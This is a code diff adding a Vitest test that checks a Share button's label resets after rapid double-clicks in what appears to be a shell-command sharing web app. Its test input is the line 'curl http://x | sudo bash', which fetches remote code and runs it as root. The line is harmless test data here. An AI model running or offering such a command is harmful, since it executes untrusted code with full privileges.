@@ -1,4 +1,4 @@
-import { afterEach, beforeEach, describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { mount } from "../src/main";
 
 function setup(): HTMLElement {
@@ -91,6 +91,27 @@ describe("mount", () => {
     shareButton.click();
 
     expect(decodeURIComponent(window.location.hash)).toContain("curl http://x | sudo bash");
+  });
+
+  it("recovers the Share button label after rapid double-clicks instead of wedging on Copied!", () => {
+    vi.useFakeTimers();
+    try {
+      const input = document.querySelector<HTMLTextAreaElement>("#command-input")!;
+      const shareButton = document.querySelector<HTMLButtonElement>("#share-btn")!;
+      const originalLabel = shareButton.textContent;
+
+      input.value = "curl http://x | sudo bash";
+      input.dispatchEvent(new Event("input"));
+
+      shareButton.click();
+      vi.advanceTimersByTime(100);
+      shareButton.click();
+      vi.advanceTimersByTime(2000);
+
+      expect(shareButton.textContent).toBe(originalLabel);
+    } finally {
+      vi.useRealTimers();
+    }
   });
 });
 
